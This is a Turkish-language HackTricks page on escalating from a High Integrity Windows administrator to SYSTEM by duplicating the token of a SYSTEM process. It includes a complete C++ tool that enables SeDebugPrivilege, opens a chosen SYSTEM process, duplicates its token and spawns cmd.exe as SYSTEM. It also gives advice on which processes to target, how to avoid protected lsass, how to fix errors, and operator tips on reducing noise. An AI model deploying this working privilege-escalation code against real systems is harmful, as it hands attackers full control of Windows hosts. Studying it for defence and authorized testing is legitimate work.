# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, **koruması yüksek bir administrator process** üzerinden **korumasız bir SYSTEM process'i açarak, token'ını duplicate edip bu token ile bir child process başlatarak** **`NT AUTHORITY\SYSTEM`** seviyesine geçişin **manual** yöntemini anlatır.

Yalnızca **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** yetkilerine sahipseniz ancak uygun bir SYSTEM process'i açamıyorsanız, **Potato / named-pipe** yöntemi genellikle daha güvenilirdir:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Yalnızca `SYSTEM` değil, mümkün olduğunca fazla yetkiye sahip bir **SYSTEM token** istiyorsanız şuna da bakın:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Hızlı triage

Bir token çalmayı denemeden önce context'i hızlıca doğrulayın:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Pratik notlar:

- **High Integrity** admin token'ı genellikle **SeDebugPrivilege** özelliğini etkinleştirmek ve koruma altında olmayan birçok SYSTEM process'ini açmak için yeterlidir.
- **`CreateProcessWithTokenW`**, çağıran process üzerinde **SeImpersonatePrivilege** gerektirir. Bu API `1314` hatasıyla başarısız olursa ve SYSTEM primary token'ını zaten duplicate ettiyseniz, **`CreateProcessAsUserW`** kullanın.
- Modern Windows'ta **`lsass.exe`**, **LSA protection / PPL** erişimi, **SeDebugPrivilege** özelliğine sahip yöneticiler için bile engellediğinden genellikle kötü bir hedeftir. Bunun yerine **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** veya SYSTEM olarak çalışan erken bir **`svchost.exe`** tercih edin.
- Her SYSTEM process'i aynı derecede kullanışlı bir token'a sahip değildir. SYSTEM elde ettiğiniz halde bazı privilege'ların eksik olduğunu fark ederseniz tekniğin bozuk olduğunu varsaymak yerine farklı bir SYSTEM process'i deneyin.

## PID'yi dikkatli seçin

Bu yöntemin güvenilir şekilde çalışmasını sağlamanın en kolay yolu, **DACL'ı Administrators grubunun process'i sorgulamasına ve token'ını duplicate etmesine gerçekten izin veren bir SYSTEM process'i seçmektir**.

Önce test edilecek iyi adaylar:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- SYSTEM olarak çalışan bazı erken `svchost.exe` örnekleri

Varsayılan olarak kaçının:

- **RunAsPPL / LSA protection** etkin olan host'larda `lsass.exe`
- **SeDebugPrivilege** etkinleştirildikten sonra bile `Access denied` döndüren korumalı / güvenlik açısından hassas process'ler

Aday process'leri ve token/ACL'lerini, elevated olarak çalışan **Process Explorer** veya **Process Hacker** ile inceleyebilirsiniz.

### Kod

Aşağıdaki kod [buradan](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962) alınmıştır. Bir **Process ID'nin argument olarak belirtilmesine** olanak tanır ve belirtilen process'in kullanıcısı olarak **çalışan bir CMD** başlatılır.<sup>[[3]](#references)</sup>\
High Integrity bir process içinde çalışırken **System olarak çalışan bir process'in PID'sini** (`winlogon`, `wininit` gibi) **belirtebilir** ve SYSTEM olarak bir `cmd.exe` çalıştırabilirsiniz.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Useful API / erişim hakkı notları

Örnek `MAXIMUM_ALLOWED` kullanıyor, ancak gerçek işlemler için ilgili minimum parçaları hatırlamak yararlıdır:

- `OpenProcessToken()` yalnızca **process handle**'ının **`PROCESS_QUERY_LIMITED_INFORMATION`** ile açılmış olmasını gerektirir.
- `CreateProcessWithTokenW()` kullanmak için **primary token handle**'ı **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** haklarına sahip olmalıdır.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` yalnızca bir impersonation token değil, bir **primary token** (`TokenPrimary`) oluşturmalıdır.
- SYSTEM olarak zaten impersonation yaptıysanız ve `CreateProcessWithTokenW()` yine de `1314` hatasıyla başarısız oluyorsa bunun yerine `CreateProcessAsUserW()` deneyin.

Bu, hedef process'i `PROCESS_ALL_ACCESS` ile açmanın genellikle gereksiz ve yalnızca token'ı sorgulamak için gereken hakları istemekten **daha fazla gürültü oluşturduğu** anlamına gelir.

## Hata

Bazı durumlarda System impersonation yapmayı deneyebilirsiniz ancak işlem çalışmaz ve aşağıdakine benzer bir çıktı gösterir:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Bu, High Integrity level üzerinde çalışıyor olsanız bile söz konusu process/token üzerinde **yeterli izinlere sahip olmadığınız** anlamına gelir.\
Şimdi **Process Explorer** ile `svchost.exe` process'leri üzerindeki mevcut Administrator izinlerini kontrol edelim (isterseniz **Process Hacker** da kullanabilirsiniz):

1. Bir `svchost.exe` process'i seçin
2. Sağ tıklayın --> Properties
3. "Security" sekmesinde, sağ altta bulunan "Permissions" düğmesine tıklayın
4. "Advanced" seçeneğine tıklayın
5. "Administrators"ı seçin ve "Edit"e tıklayın
6. "Show advanced permissions" seçeneğine tıklayın

![Code - Error: 6. "Show advanced permissions" seçeneğine tıklayın](<../../images/image (437).png>)

Önceki görsel, "Administrators" grubunun seçili process üzerinde sahip olduğu tüm izinleri içerir (`svchost.exe` örneğinde gördüğünüz gibi yalnızca "Query" izinlerine sahiptirler).

"Administrators" grubunun `winlogon.exe` üzerindeki izinlerine bakın:

![Code - Error: "Administrators" grubunun winlogon.exe üzerindeki izinlerine bakın](<../../images/image (1102).png>)

Bu process içinde "Administrators" grubu "Read Memory" ve "Read Permissions" izinlerine sahiptir; bu da muhtemelen Administrators'ın bu process tarafından kullanılan token'ı impersonate etmesine olanak tanır.

### Yaygın hata nedenleri

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: Process DACL'i erişiminizi engelliyor olabilir veya hedef **protected/PPL** durumunda olabilir. Başka bir SYSTEM process'i seçin.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: Token handle'ınız yeterli haklar olmadan açılmış olabilir veya hedef token'ın DACL'i duplication işlemini engelliyor olabilir.
- **`CreateProcessWithTokenW()` -> `1314`**: Çağıran process'in **`SeImpersonatePrivilege`** yetkisi şu anda etkin değil. Önce bu yetkiyi etkinleştirmeyi deneyin veya duplicate edilmiş primary token ile `CreateProcessAsUserW()` kullanın.
- Önceki hatalardan sonra **`CreateProcessWithTokenW()` -> `1326`**: Bu genellikle önceki token duplication/impersonation adımının başarısız olduğu ve child process'i başlatmak için kullanılabilir bir primary token bulunmadığı anlamına gelir.

## Operator notları

- Bu teknik, zaten **local admin + high integrity** olduğunuzda ve bir service veya named-pipe coercion chain başlatmadan SYSTEM'e ulaşmak için hızlı, manuel bir yol istediğinizde oldukça kullanışlıdır.
- Hardened Windows 11 / Server ortamlarında **LSA protection** giderek daha yaygın hale geliyor; bu nedenle `lsass.exe`'nin her zaman okunabilir olduğunu varsayan bir workflow güvenilir değildir. **`winlogon.exe` / `wininit.exe` / `services.exe` genellikle daha iyi ilk tercihlerdir**.<sup>[[2]](#references)</sup>
- Elevated admin desktop yerine bir **service account** context'i elde ederseniz, **Potato family** genellikle bu sayfada anlatılan yöntemden daha uygundur.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: LSASS'e dokunmadan Active Directory'yi tehlikeye atmak için Windows token'larını kötüye kullanma](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Process Token'larını Anlama ve Kötüye Kullanma — Part II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)

{{#include ../../banners/hacktricks-training.md}}
